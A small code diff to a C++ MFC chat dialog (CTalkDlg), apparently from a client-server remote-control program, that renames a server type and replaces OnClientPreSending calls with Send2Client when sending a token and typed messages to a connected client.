@@ -10,7 +10,7 @@
 
 IMPLEMENT_DYNAMIC(CTalkDlg, CDialog)
 
-CTalkDlg::CTalkDlg(CWnd* pParent,IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
+CTalkDlg::CTalkDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT* ContextObject)
 	: DialogBase(CTalkDlg::IDD, pParent, IOCPServer, ContextObject, IDR_MAINFRAME)
 {
 }
@@ -42,7 +42,7 @@ BOOL CTalkDlg::OnInitDialog()
 
 	SetIcon(m_hIcon, FALSE);
 	BYTE bToken = COMMAND_NEXT;  
-	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
+	m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
 
 	return TRUE;  // return TRUE unless you set the focus to a control
 	// 异常: OCX 属性页应返回 FALSE
@@ -66,7 +66,7 @@ void CTalkDlg::OnBnClickedButtonTalk()
 
 	m_EditTalk.SetWindowText(NULL);
 
-	m_iocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)szBuffer, strlen(szBuffer));
+	m_iocpServer->Send2Client(m_ContextObject, (LPBYTE)szBuffer, strlen(szBuffer));
 }
 
 
